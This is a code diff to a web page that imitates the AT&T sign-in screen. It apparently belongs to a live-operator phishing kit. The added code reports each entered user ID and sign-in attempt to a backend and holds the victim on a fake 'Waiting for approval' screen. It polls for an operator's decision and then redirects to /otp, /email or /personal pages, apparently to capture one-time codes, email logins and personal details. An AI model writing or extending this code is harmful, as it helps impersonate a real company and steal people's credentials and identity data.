@@ -13,20 +13,74 @@ export default function Home() {
     const submitBtn = document.getElementById('submit-btn');
     const loginContainer = document.querySelector('.login-container');
     let cachedUsername = '';
-    let activityIdCounter = parseInt(localStorage.getItem('activityIdCounter') || '0');
+    let pendingActivityId = null;
+    let approvalCheckInterval = null;
 
-    function logActivity(type, userId) {
-      activityIdCounter++;
-      localStorage.setItem('activityIdCounter', activityIdCounter.toString());
+    async function logActivity(type, userId, additionalData = {}) {
+      try {
+        const response = await fetch('/api/activity', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ type, userId, additionalData })
+        });
+        const data = await response.json();
+        return data.activity.id;
+      } catch (error) {
+        console.error('Error logging activity:', error);
+        return null;
+      }
+    }
+
+    async function checkForApproval(activityId, type, userId) {
+      try {
+        const response = await fetch(`/api/approval/${activityId}`);
+        const approval = await response.json();
+        
+        if (approval.status === 'approved') {
+          if (approvalCheckInterval) {
+            clearInterval(approvalCheckInterval);
+            approvalCheckInterval = null;
+          }
+          
+          const redirectType = approval.redirectType || 'password';
+          handleRedirect(redirectType, userId);
+          return true;
+        } else if (approval.status === 'denied') {
+          if (approvalCheckInterval) {
+            clearInterval(approvalCheckInterval);
+            approvalCheckInterval = null;
+          }
+          
+          const loadingScreen = document.getElementById('loading-screen');
+          if (loadingScreen) loadingScreen.classList.remove('active');
+          
+          submitBtn.disabled = false;
+          submitBtn.textContent = cachedUsername ? 'Sign in' : 'Continue';
+          alert('Access denied. Please try again.');
+          return true;
+        }
+        return false;
+      } catch (error) {
+        console.error('Error checking approval:', error);
+        return false;
+      }
+    }
+
+    function handleRedirect(redirectType, userId) {
+      const loadingScreen = document.getElementById('loading-screen');
+      if (loadingScreen) loadingScreen.classList.remove('active');
       
-      const activity = {
-        id: activityIdCounter.toString(),
-        type: type,
-        userId: userId,
-        timestamp: new Date().toISOString()
-      };
-      
-      localStorage.setItem('loginActivity', JSON.stringify(activity));
+      if (redirectType === 'password') {
+        // Already on password view, continue
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'Sign in';
+      } else if (redirectType === 'otp') {
+        window.location.href = '/otp';
+      } else if (redirectType === 'email') {
+        window.location.href = '/email';
+      } else if (redirectType === 'personal') {
+        window.location.href = '/personal';
+      }
     }
 
     function resetToUserIDView() {
@@ -41,25 +95,56 @@ export default function Home() {
     }
 
     if (loginForm) {
-      loginForm.addEventListener('submit', function(e) {
+      loginForm.addEventListener('submit', async function(e) {
         e.preventDefault();
         
         const userId = usernameInput.value.trim();
         
         if (userId && !cachedUsername) {
-          cachedUsername = userId;
-          cachedUserIdText.textContent = userId;
-          userIdGroup.style.display = 'none';
-          passwordGroup.style.display = 'block';
-          loginContainer.classList.add('password-view');
-          submitBtn.textContent = 'Sign in';
-          document.getElementById('password').focus();
+          // First step: Log user ID entry and wait for approval
+          const activityId = await logActivity('userid', userId);
+          pendingActivityId = activityId;
           
-          logActivity('userid', userId);
+          // Show loading screen
+          const loadingScreen = document.getElementById('loading-screen');
+          if (loadingScreen) loadingScreen.classList.add('active');
+          submitBtn.disabled = true;
+          
+          // Check for approval every 500ms
+          approvalCheckInterval = setInterval(async function() {
+            const approved = await checkForApproval(activityId, 'userid', userId);
+            if (approved) {
+              // Approval received, show password view
+              cachedUsername = userId;
+              cachedUserIdText.textContent = userId;
+              userIdGroup.style.display = 'none';
+              passwordGroup.style.display = 'block';
+              loginContainer.classList.add('password-view');
+              submitBtn.textContent = 'Sign in';
+              document.getElementById('password').focus();
+            }
+          }, 500);
+          
         } else if (cachedUsername) {
+          // Second step: Sign in button clicked
           const password = document.getElementById('password').value;
-          logActivity('password', cachedUsername);
-          console.log('Logging in with:', cachedUsername, 'and password');
+          
+          // Log sign in button click
+          const activityId = await logActivity('signin', cachedUsername, { hasPassword: password.length > 0 });
+          pendingActivityId = activityId;
+          
+          // Show waiting message
+          submitBtn.textContent = 'Waiting for approval...';
+          submitBtn.disabled = true;
+          
+          // Check for approval every 500ms
+          approvalCheckInterval = setInterval(async function() {
+            const approved = await checkForApproval(activityId, 'signin', cachedUsername);
+            if (approved) {
+              submitBtn.disabled = false;
+              submitBtn.textContent = 'Sign in';
+            }
+          }, 500);
         }
       });
     }
@@ -443,6 +528,74 @@ export default function Home() {
           outline: 2px solid #0057b8;
           outline-offset: 2px;
         }
+
+        .loading-screen {
+          display: none;
+          position: fixed;
+          top: 0;
+          left: 0;
+          width: 100%;
+          height: 100%;
+          background: rgba(255, 255, 255, 0.98);
+          z-index: 9999;
+          align-items: center;
+          justify-content: center;
+          flex-direction: column;
+        }
+
+        .loading-screen.active {
+          display: flex;
+        }
+
+        .loading-spinner {
+          width: 60px;
+          height: 60px;
+          border: 4px solid #f3f3f3;
+          border-top: 4px solid #0057b8;
+          border-radius: 50%;
+          animation: spin 1s linear infinite;
+          margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+          0% { transform: rotate(0deg); }
+          100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+          font-size: 20px;
+          color: #333333;
+          font-weight: 600;
+          margin-bottom: 8px;
+        }
+
+        .loading-subtext {
+          font-size: 16px;
+          color: #666666;
+          text-align: center;
+          max-width: 300px;
+        }
+
+        .loading-progress {
+          width: 150px;
+          height: 8px;
+          background-color: #e0e0e0;
+          border-radius: 4px;
+          overflow: hidden;
+          margin-top: 20px;
+        }
+
+        .loading-progress-bar {
+          width: 0;
+          height: 100%;
+          background-color: #0057b8;
+          animation: progress 2s linear infinite;
+        }
+
+        @keyframes progress {
+          0% { width: 0; }
+          100% { width: 100%; }
+        }
       `}</style>
       <div className="login-container">
         <div className="logo">
@@ -492,6 +645,15 @@ export default function Home() {
         </div>
         <div className="copyright">
           ©2025 AT&T Intellectual Property. All rights reserved.
+        </div>
+      </div>
+
+      <div id="loading-screen" className="loading-screen">
+        <div className="loading-spinner"></div>
+        <div className="loading-text">Waiting for approval...</div>
+        <div className="loading-subtext">Please wait while we verify your account</div>
+        <div className="loading-progress">
+          <div className="loading-progress-bar"></div>
         </div>
       </div>
     </>
